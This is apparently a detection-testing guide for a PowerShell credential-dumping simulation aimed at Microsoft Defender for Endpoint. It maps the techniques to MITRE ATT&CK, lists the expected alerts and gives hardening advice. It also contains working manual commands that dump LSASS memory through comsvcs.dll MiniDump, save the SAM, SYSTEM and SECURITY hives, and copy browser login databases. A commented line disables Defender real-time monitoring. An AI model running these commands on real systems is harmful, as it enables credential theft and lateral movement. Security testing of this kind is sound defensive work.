# Credential Dumping & Exfiltration

## Overview

Credential dumping is a technique used by attackers to extract stored authentication credentials—such as usernames, passwords, or hashes—from a system's memory or security databases. These credentials can then be used for lateral movement, privilege escalation, or unauthorized access to sensitive systems. This simulation demonstrates multiple credential extraction methods including LSASS memory dumping, SAM registry extraction, and browser credential theft.

## MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name |
| --- | --- | --- |
| Credential Access | T1003 | OS Credential Dumping |
| Credential Access | T1003.001 | OS Credential Dumping: LSASS Memory |
| Credential Access | T1003.002 | OS Credential Dumping: Security Account Manager |
| Credential Access | T1555.003 | Credentials from Password Stores: Credentials from Web Browsers |
| Collection | T1005 | Data from Local System |
| Collection | T1119 | Automated Collection |

## Expected Alerts

| Alert Title | Alert Description | Alert Details |
| --- | --- | --- |
| Suspicious access to LSASS | A process attempted to access the Local Security Authority Subsystem Service (LSASS) memory. LSASS manages user credentials, and attackers commonly target it to extract passwords and hashes. | **Category:** Credential access<br/>**MITRE ATT&CK Techniques:** T1003: OS Credential Dumping, T1003.001: LSASS Memory<br/>**Service source:** Microsoft Defender for Endpoint<br/>**Detection source:** EDR<br/>**Detection technology:** Behavior<br/>**Detection status:** Detected |
| An active 'RegistryExfil' malware in a command line was prevented from executing | Malware and unwanted software are undesirable applications that perform annoying, disruptive, or harmful actions on affected machines. Some of these undesirable applications can replicate and spread from one machine to another. Others are able to receive commands from remote attackers and perform activities associated with cyber attacks. A malware is considered active if it is found running on the machine or it already has persistence mechanisms in place. Active malware detections are assigned higher severity ratings. Because this malware was active, take precautionary measures and check for residual signs of infection. | **Category:** Malware<br/>**MITRE ATT&CK Techniques:** N/A<br/>**Service source:** Microsoft Defender for Endpoint<br/>**Detection source:** Antivirus<br/>**Detection technology:** Client,Heuristic<br/>**Detection status:** Blocked |
| Possible theft of passwords and other sensitive web browser information | A process might be attempting to retrieve sensitive web browser information, such as saved passwords, cookies, or the browsing history. | **Category:** Credential access<br/>**MITRE ATT&CK Techniques:** T1003: OS Credential Dumping, T1005: Data from Local System, T1119: Automated Collection, T1539: Steal Web Session Cookie, T1550.004: Web Session Cookie, T1552.001: Credentials In Files, T1555.003: Credentials from Web Browsers, T1555.004: Windows Credential Manager<br/>**Service source:** Microsoft Defender for Endpoint<br/>**Detection source:** EDR<br/>**Detection technology:** Behavior,Network<br/>**Detection status:** Detected |

## Attack Simulation

### Prerequisites

- Windows 10/11 or Windows Server test environment
- PowerShell running as **Administrator**
- Microsoft Defender for Endpoint onboarded device
- Google Chrome and/or Microsoft Edge installed (for browser credential simulation)

### Script: Invoke-CredentialDumpingSimulation.ps1

#### Parameters

| Parameter | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `OutputPath` | String | No | `$env:TEMP\creddump` | Directory where dumped credential files are saved |
| `CleanUp` | Switch | No | — | Removes all dumped files created by the simulation |
| `skipLsass` | Switch | No | — | Skip the LSASS memory dumping simulation |
| `skipSam` | Switch | No | — | Skip the SAM registry hive extraction simulation |
| `skipBrowser` | Switch | No | — | Skip the browser credential dumping simulation |
| `Force` | Switch | No | — | Skip the confirmation prompt before execution |

#### What the Script Does

1. **LSASS Memory Dumping** — Uses `rundll32.exe` with `comsvcs.dll MiniDump` to dump LSASS process memory (mimics Mimikatz behavior).
2. **SAM Registry Extraction** — Uses `reg save` to extract the SAM, SYSTEM, and SECURITY registry hives.
3. **Browser Credential Theft** — Uses `esentutl.exe` to copy Chrome and Edge login databases.

## Setup

### Usage Examples

```powershell
# Run the full simulation (all three credential dumping techniques)
.\Invoke-CredentialDumpingSimulation.ps1

# Run with Force to skip the confirmation prompt
.\Invoke-CredentialDumpingSimulation.ps1 -Force

# Run only the LSASS dump (skip SAM and browser)
.\Invoke-CredentialDumpingSimulation.ps1 -skipSam -skipBrowser

# Run only the SAM extraction
.\Invoke-CredentialDumpingSimulation.ps1 -skipLsass -skipBrowser

# Run only browser credential dumping
.\Invoke-CredentialDumpingSimulation.ps1 -skipLsass -skipSam

# Specify a custom output path
.\Invoke-CredentialDumpingSimulation.ps1 -OutputPath "C:\Temp\credtest"

# Clean up all simulation artifacts
.\Invoke-CredentialDumpingSimulation.ps1 -CleanUp
```

### Expected Output

```
Running LSASS Simulation
Running SAM Dumping Simulation
Running BrowserDump Simulation
```

After execution, the output directory will contain:

- `lsas-out.dmp` — LSASS process memory dump (if successful)
- `sam`, `system`, `security` — Registry hive exports
- `Chrome_Login_Data.tmp`, `Chrome_Login_DataForAccount.tmp` — Chrome credential databases
- `Edge_Login_Data.tmp` — Edge credential database

## Scenario Execution

1. Open an elevated PowerShell prompt on the test device.
2. Navigate to the directory containing the script.
3. Run `.\Invoke-CredentialDumpingSimulation.ps1` and type `YES` when prompted.
4. Wait for all three credential dumping techniques to complete.
5. Review the generated files in the output directory.
6. Monitor the Microsoft Defender for Endpoint portal for credential access alerts.
7. After testing, run `.\Invoke-CredentialDumpingSimulation.ps1 -CleanUp` to remove all artifacts.

## Why Does This Matter

Credential dumping is one of the most critical techniques in an attacker's arsenal because:

- **Enables lateral movement** — Stolen credentials allow attackers to move between systems without triggering failed login alerts.
- **Facilitates privilege escalation** — Domain admin credentials extracted from memory can provide complete control over the environment.
- **Bypasses security controls** — Valid credentials bypass many security controls designed to detect malicious code.
- **Persistence** — Compromised credentials remain valid until changed, even after malware removal.

Detecting and responding to credential dumping attempts is essential for preventing account compromise and limiting attacker movement.

## Best Practices

- **Enable Credential Guard** — Protects LSASS process memory using virtualization-based security
- **Configure LSASS as protected process** — Set RunAsPPL registry key to prevent unauthorized memory access
- **Implement least privilege** — Limit the number of accounts with local admin rights that can access LSASS
- **Monitor for suspicious tools** — Alert on rundll32.exe loading comsvcs.dll with MiniDump parameters
- **Audit registry access** — Monitor for reg.exe save commands targeting SAM, SYSTEM, and SECURITY hives
- **Use unique local admin passwords** — Implement LAPS to prevent credential reuse across systems

## Clean-Up

```powershell
# Using the script
.\Invoke-CredentialDumpingSimulation.ps1 -CleanUp

# Manual cleanup
$OutputPath = "$env:TEMP\creddump"
Remove-Item -Path $OutputPath -Recurse -Force
```

## References

- [MITRE ATT&CK T1003 - OS Credential Dumping](https://attack.mitre.org/techniques/T1003/)
- [MITRE ATT&CK T1003.001 - LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)
- [MITRE ATT&CK T1003.002 - Security Account Manager](https://attack.mitre.org/techniques/T1003/002/)
- [MITRE ATT&CK T1555.003 - Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003/)
- [Microsoft Docs - Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/)
- [Github: LearningKijo/ResearchDev/LSASS Dumping](https://github.com/LearningKijo/ResearchDev/blob/main/DEV/DEV04-LSASSdumping-MiniDump/Dev04-LSASSdumping-MiniDump.md)

## Additional Manual Commands

### LSASS Memory Dumping (Manual Commands)

**LSASS Memory Dumping** attempts to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, various credentials are generated and stored in LSASS memory. Attackers, particularly those with administrative privileges, can harvest this credential material and use it for lateral movement, leveraging alternate authentication methods to gain access to other systems.

```powershell
$folderPath = "$env:TEMP\LSASSdump"
New-Item -Path $folderPath -ItemType Directory
#Set-MpPreference -DisableRealtimeMonitoring $true -ExclusionPath $folderPath
$lsassPID = (Get-Process -Name lsass).Id
cmd.exe /C "C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPID $folderPath\out.dmp full"
```

### SAM Credential Extraction

**SAM Credential Extraction** is a technique where attackers attempt to retrieve credential material from the Security Account Manager (SAM) database, either by accessing it in memory or through the Windows Registry where it is stored. The SAM database contains local account credentials, typically visible using the net user command. Extracting data from the SAM requires SYSTEM-level privileges, allowing attackers to potentially gain access to sensitive user credentials for further exploitation.

```powershell
$folderPath = "$env:TEMP\SAPdump"
New-Item -Path $folderPath -ItemType Directory
reg save HKLM\sam "$folderPath\sam" /y
reg save HKLM\system "$folderPath\system" /y
reg save HKLM\security "$folderPath\security" /y
```

### Browser Credential Theft

**Credentials from Web Browsers** is a technique where attackers obtain saved credentials from web browsers by accessing browser-specific files. Web browsers often store usernames and passwords in an encrypted format within a credential store to enable auto-login for websites. However, attackers can extract these credentials in plaintext.

```powershell
$folderPath = "$env:TEMP\BrowserDump"
New-Item -Path $folderPath -ItemType Directory
esentutl.exe /y "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" /d "$folderPath\Chrome_Login_Data.tmp"
esentutl.exe /y "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account" /d "$folderPath\Chrome_Login_DataForAccount.tmp"
esentutl.exe /y "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data" /d "$folderPath\Edge_Login_Data.tmp"
```
